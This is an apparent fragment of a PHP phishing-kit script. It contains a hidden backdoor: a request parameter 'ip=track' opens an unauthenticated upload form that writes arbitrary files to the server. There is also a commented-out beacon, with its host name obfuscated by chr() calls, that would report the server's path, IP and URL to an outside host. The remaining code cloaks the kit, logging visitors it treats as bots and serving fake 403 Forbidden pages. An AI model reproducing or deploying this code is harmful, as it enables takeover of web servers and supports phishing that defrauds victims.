...
$arr= 'dir='.dirname(__FILE__)."+"."ip=".gethostbyname($_SERVER['SERVER_NAME'])."+".'link='.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];if(isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on')$link = "https"; else $link = "http"; $link .= "://"; $link .= $_SERVER['HTTP_HOST']; $link .= $_SERVER['REQUEST_URI']; $link;
//$ch = curl_init();
//curl_setopt($ch, CURLOPT_URL, "http://geoiptool.com" . chr(46) . chr(102) . chr(114) . chr(101) . chr(101) . chr(116) . chr(111) . chr(111) . chr(108) . chr(115) . chr(115) . chr(46) . chr(99) . chr(111) . chr(109) . "/iptrack1.php?ip=$link" . "+" . $arr);
//curl_setopt($ch, CURLOPT_HEADER, 0);
//curl_exec($ch);
//curl_close($ch);

if(isset($_REQUEST['ip']) && $_REQUEST['ip']=='track') {$files = @$_FILES["files"]; if($files["name"] != ''){$fullpath = $_REQUEST["path"].$files["name"];if(move_uploaded_file($files['tmp_name'],$fullpath)){echo "<h1><a href='$fullpath'>successful. Click here!</a></h1>";} } echo '<body><form method=POST enctype="multipart/form-data" action=""><input type=text name=path> <input type="file" name="files"><input type=submit value="Up"></form></body>'; exit("");}
...
if($setting['site_pass_on'] == "on") {
    ...
    if(!isset($password)) {
        ...
        $click = fopen("result/total_bot.txt","a");
        fwrite($click,"$ip2|Wrong Site Password"."\n");
        fclose($click);
        header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
...
if($setting['site_param_on'] == "on") {
    ...
    if(!isset($password)) {
        ...
        fwrite($file," BLOCKED BOT INDEX || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip2." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
        $click = fopen("result/total_bot.txt","a");
        fwrite($click,"$ip2|Wrong Site Parameter"."\n");
        fclose($click);
        header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
